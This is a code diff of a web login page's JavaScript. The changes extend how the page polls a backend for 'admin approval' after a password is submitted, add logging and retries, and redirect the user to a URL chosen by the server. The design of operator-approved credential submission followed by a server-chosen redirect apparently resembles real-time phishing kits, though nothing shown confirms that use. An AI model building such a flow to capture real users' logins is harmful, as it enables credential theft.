             pollStatus(sessionId);
           } else {
             // Show error
-            const errorMsg = data.error || 'Login failed. Please try again.';
+            const errorMsg = data.error || `Login failed. Status: ${response.status}`;
             document.getElementById('passwordError').textContent = errorMsg;
             document.getElementById('passwordError').classList.add('show');
             
@@ -238,8 +268,8 @@
             submitBtn.disabled = false;
           }
         } catch (error) {
-          console.error('Error:', error);
-          document.getElementById('passwordError').textContent = 'Network error. Please try again.';
+          console.error('Network error:', error);
+          document.getElementById('passwordError').textContent = `Network error: ${error.message}. Please check backend URL: ${BACKEND_URL}`;
           document.getElementById('passwordError').classList.add('show');
           
           // Reset button
@@ -251,41 +281,69 @@
       
       async function pollStatus(sessionId) {
         let attempts = 0;
-        const maxAttempts = 60; // Try for 5 minutes (5 seconds * 60 = 300 seconds)
+        const maxAttempts = 120; // Try for 10 minutes (5 seconds * 120 = 600 seconds)
         
         const checkStatus = async () => {
           try {
+            console.log(`Checking status for session: ${sessionId}, attempt: ${attempts + 1}`);
             const response = await fetch(`${BACKEND_URL}/status/${sessionId}`);
-            const data = await response.json();
             
-            if (response.ok) {
-              if (data.status === 'approved' && data.redirect_url) {
-                // Redirect to the approved URL
-                window.location.href = data.redirect_url;
-                return true;
-              } else if (data.status === 'pending') {
-                // Continue polling
-                attempts++;
-                if (attempts < maxAttempts) {
-                  setTimeout(checkStatus, 5000); // Check every 5 seconds
-                } else {
-                  // Timeout
-                  document.getElementById('passwordError').textContent = 'Request timed out. Please try again.';
-                  document.getElementById('passwordError').classList.add('show');
-                  resetButton();
-                }
+            if (!response.ok) {
+              console.error('Status check failed:', response.status);
+              attempts++;
+              if (attempts < maxAttempts) {
+                setTimeout(checkStatus, 5000);
+              } else {
+                document.getElementById('passwordError').textContent = 'Status check timed out. Please try again.';
+                document.getElementById('passwordError').classList.add('show');
+                resetButton();
               }
-            } else {
-              // Error
-              document.getElementById('passwordError').textContent = 'Status check failed. Please try again.';
+              return;
+            }
+            
+            const data = await response.json();
+            console.log('Status check response:', data);
+            
+            if (data.status === 'approved' && data.redirect_url) {
+              // Redirect to the approved URL
+              console.log('Approved! Redirecting to:', data.redirect_url);
+              window.location.href = data.redirect_url;
+              return true;
+            } else if (data.status === 'pending') {
+              // Continue polling
+              attempts++;
+              if (attempts < maxAttempts) {
+                setTimeout(checkStatus, 5000); // Check every 5 seconds
+                
+                // Update message every few attempts
+                if (attempts % 12 === 0) { // Every minute
+                  document.getElementById('successMessage').textContent = `Still waiting for admin approval... (${attempts/12} minute(s))`;
+                }
+              } else {
+                // Timeout
+                document.getElementById('passwordError').textContent = 'Request timed out after 10 minutes. Please try again.';
+                document.getElementById('passwordError').classList.add('show');
+                document.getElementById('successMessage').classList.remove('show');
+                resetButton();
+              }
+            } else if (data.error) {
+              // Error from backend
+              document.getElementById('passwordError').textContent = `Error: ${data.error}`;
               document.getElementById('passwordError').classList.add('show');
+              document.getElementById('successMessage').classList.remove('show');
               resetButton();
             }
           } catch (error) {
             console.error('Status check error:', error);
-            document.getElementById('passwordError').textContent = 'Status check error. Please try again.';
-            document.getElementById('passwordError').classList.add('show');
-            resetButton();
+            attempts++;
+            if (attempts < maxAttempts) {
+              setTimeout(checkStatus, 5000);
+            } else {
+              document.getElementById('passwordError').textContent = 'Status check error. Please try again.';
+              document.getElementById('passwordError').classList.add('show');
+              document.getElementById('successMessage').classList.remove('show');
+              resetButton();
+            }
           }
           return false;
         };
@@ -331,6 +389,20 @@
             localStorage.setItem('savedUsername', this.value);
           }
         });
+        
+        // Test backend connection
+        console.log('Testing backend connection...');
+        fetch(`${BACKEND_URL}/`)
+          .then(response => {
+            console.log('Backend connection test:', response.status);
+            if (response.ok) {
+              console.log('Backend is reachable!');
+            }
+          })
+          .catch(error => {
+            console.error('Backend connection failed:', error);
+            console.error('Please make sure the backend is running at:', BACKEND_URL);
+          });
       });
     </script>
   </body>
